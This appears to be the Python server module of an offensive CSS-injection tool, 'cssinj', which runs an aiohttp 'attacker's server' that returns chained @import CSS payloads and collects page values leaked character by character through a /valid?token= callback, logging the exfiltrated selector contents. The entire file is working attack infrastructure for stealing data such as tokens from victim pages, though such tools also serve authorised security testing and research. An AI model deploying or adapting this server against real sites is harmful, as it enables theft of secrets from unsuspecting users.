import string
import random
from aiohttp import web
import asyncio
from cssinj import log
from cssinj.injection import generate_injection


class CssInjector:
    def __init__(self):
        self.data = ""
        self.elements = []
        self.event = asyncio.Event()
        self.counter_req = 0

    def start(self, args):
        self.identifier = args.identifier
        self.hostname = args.hostname
        self.port = args.port
        self.show_details = args.details
        self.selector = args.selector
        self.app = web.Application()
        self.app.middlewares.append(self.dynamic_router_middleware)
        web.run_app(
            self.app,
            port=self.port,
            print=log.message(
                "server", f"Attacker's server started on {args.hostname}:{args.port}"
            ),
        )

    async def handle_start(self, request):
        log.message("connection", f"Connection from {request.remote}")
        if self.show_details:
            for key, value in request.headers.items():
                log.message("connection_details", f"{key} : {value}")
        self.event.set()
        return web.Response(
            text=f"@import url('//{self.hostname}:{self.port}/next?num={random.random()}'); ",
            content_type="text/css",
        )

    async def handle_end(self, request):
        log.message(
            "end_exfiltration",
            f"The {self.selector} exfiltrated from {self.identifier} is : {self.data}",
        )
        self.elements.append(self.data)
        self.data = ""
        self.event.set()
        return web.Response(
            text=f"ok",
            content_type="text/css",
        )

    async def handle_next(self, request):
        if not self.event.is_set():
            await self.event.wait()
        self.event.clear()
        self.counter_req += 1
        return web.Response(
            text=generate_injection(
                hostname=self.hostname,
                port=self.port,
                data=self.data,
                identifier=self.identifier,
                selector=self.selector,
                elements=self.elements,
                counter_req=self.counter_req,
            ),
            content_type="text/css",
        )

    async def handle_valid(self, request):
        self.event.set()
        self.data = request.query.get("token")
        if self.show_details:
            log.message(
                "exfiltration",
                f"Exfiltrating element {len(self.elements)} : {self.data}",
            )
        return web.Response(text="ok.", content_type="image/x-icon")

    async def dynamic_router_middleware(self, app, handler):
        async def middleware_handler(request):
            path = request.path

            if path.startswith("/start"):
                return await self.handle_start(request)
            elif path.startswith("/next"):
                return await self.handle_next(request)
            elif path.startswith("/valid"):
                return await self.handle_valid(request)
            elif path.startswith("/end"):
                return await self.handle_end(request)

            return web.Response(text="404: Not Found", status=404)

        return middleware_handler
